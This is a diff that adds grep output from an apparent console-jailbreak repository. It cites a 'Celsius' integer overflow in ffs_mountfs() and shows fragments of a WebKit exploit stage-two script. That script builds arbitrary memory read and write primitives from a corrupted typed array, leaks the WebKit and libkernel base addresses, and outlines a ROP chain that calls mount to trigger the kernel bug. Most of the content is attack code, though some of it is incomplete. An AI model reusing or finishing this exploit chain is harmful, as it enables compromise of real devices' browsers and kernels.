@@ -1,0 +1,61 @@
+./README.md:23:- 🔥 **Celsius (ffs_mount)** — Integer overflow in ffs_mountfs(), works up to 13.04, patched in 13.50. Discovered by bollars.
+./README.md:63:- **Celsius / ffs_mount** — Integer overflow in ffs_mountfs() (CONFIRMED for 13.04)
+./README.md:67:The vulnerability is in `ffs_mountfs()` in `sys/ufs/ffs/ffs_vfsops.c`:
+./cve_analysis.md:32:- **Component:** ffs_mountfs() in sys/ufs/ffs/ffs_vfsops.c
+./jordy_stage2.js:6://    with a call to stage2_init()
+./jordy_stage2.js:12:var g_candidate = null;       // The SSV candidate that controls m_vector
+./jordy_stage2.js:13:var g_rwView = null;          // The genuine Uint8Array we redirect
+./jordy_stage2.js:17:var g_webkit_base = 0;
+./jordy_stage2.js:18:var g_libkernel_base = 0;
+./jordy_stage2.js:55:function stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords) {
+./jordy_stage2.js:56:    g_candidate = candidate;
+./jordy_stage2.js:57:    g_rwView = rwView;
+./jordy_stage2.js:76:    if (g_candidate && g_rwHeader) {
+./jordy_stage2.js:78:            g_candidate[0x10 + i] = g_rwHeader[0x10 + i];
+./jordy_stage2.js:93:        g_candidate[0x10 + i] = g_scratchBytes[i];
+./jordy_stage2.js:98:    return g_rwView[0];
+./jordy_stage2.js:103:    return g_rwView[0] | (g_rwView[1] << 8);
+./jordy_stage2.js:108:    return g_rwView[0] 
+./jordy_stage2.js:109:        + g_rwView[1] * 0x100 
+./jordy_stage2.js:110:        + g_rwView[2] * 0x10000 
+./jordy_stage2.js:111:        + g_rwView[3] * 0x1000000;
+./jordy_stage2.js:116:    var lo = g_rwView[0] 
+./jordy_stage2.js:117:        + g_rwView[1] * 0x100 
+./jordy_stage2.js:118:        + g_rwView[2] * 0x10000 
+./jordy_stage2.js:119:        + g_rwView[3] * 0x1000000;
+./jordy_stage2.js:120:    var hi = g_rwView[4] 
+./jordy_stage2.js:121:        + g_rwView[5] * 0x100 
+./jordy_stage2.js:122:        + g_rwView[6] * 0x10000 
+./jordy_stage2.js:123:        + g_rwView[7] * 0x1000000;
+./jordy_stage2.js:129:    g_rwView[0] = val & 0xFF;
+./jordy_stage2.js:134:    g_rwView[0] = val & 0xFF;
+./jordy_stage2.js:135:    g_rwView[1] = (val >> 8) & 0xFF;
+./jordy_stage2.js:136:    g_rwView[2] = (val >> 16) & 0xFF;
+./jordy_stage2.js:137:    g_rwView[3] = (val >> 24) & 0xFF;
+./jordy_stage2.js:144:    g_rwView[0] = lo & 0xFF;
+./jordy_stage2.js:145:    g_rwView[1] = (lo >> 8) & 0xFF;
+./jordy_stage2.js:146:    g_rwView[2] = (lo >> 16) & 0xFF;
+./jordy_stage2.js:147:    g_rwView[3] = (lo >> 24) & 0xFF;
+./jordy_stage2.js:148:    g_rwView[4] = hi & 0xFF;
+./jordy_stage2.js:149:    g_rwView[5] = (hi >> 8) & 0xFF;
+./jordy_stage2.js:150:    g_rwView[6] = (hi >> 16) & 0xFF;
+./jordy_stage2.js:151:    g_rwView[7] = (hi >> 24) & 0xFF;
+./jordy_stage2.js:163:    // We know targetAddress from Jordy's addrof
+./jordy_stage2.js:166:    var vtable = read64(targetAddress);
+./jordy_stage2.js:171:    // webkit_base = vtable - known_vtable_offset
+./jordy_stage2.js:179:    // webkit_base = vtable - vtable_offset
+./jordy_stage2.js:190:    // GOT entry for pthread_create at webkit_base + 0x3ce1000 (approx)
+./jordy_stage2.js:200:    var wk = g_webkit_base;
+./jordy_stage2.js:214:    // pop rsi, ret; "sceKernelDlsym" string addr
+./jordy_stage2.js:224:    // call mount → triggers ffs_mountfs → Celsius
+./jordy_stage2.js:248:    log("[S2] TODO: Implement execution pivot");
+./jordy_stage2.js:257:    g_webkit_base = findWebkitBase();
+./jordy_stage2.js:258:    if (g_webkit_base === 0) {
+./jordy_stage2.js:259:        log("[S2] Could not determine webkit_base - need vtable offset");
+./jordy_stage2.js:260:        log("[S2] Dumping first 64 bytes at targetAddress for analysis...");
+./jordy_stage2.js:263:            var b = read8(targetAddress + i);
+./jordy_stage2.js:272:    log("[S2] webkit_base = 0x" + g_webkit_base.toString(16));
+./jordy_stage2.js:274:    g_libkernel_base = findLibkernelBase();
+./jordy_stage2.js:275:    log("[S2] libkernel_base = 0x" + g_libkernel_base.toString(16));
+./jordy_stage2.js:298://   stage2_init(candidate, rwView, rwHeader, scratchBytes, scratchWords);
+./webkit_gadgets_1304.js:27:// ffs_mountfs string at 0x7d021f in BOTH (Celsius NOT patched)
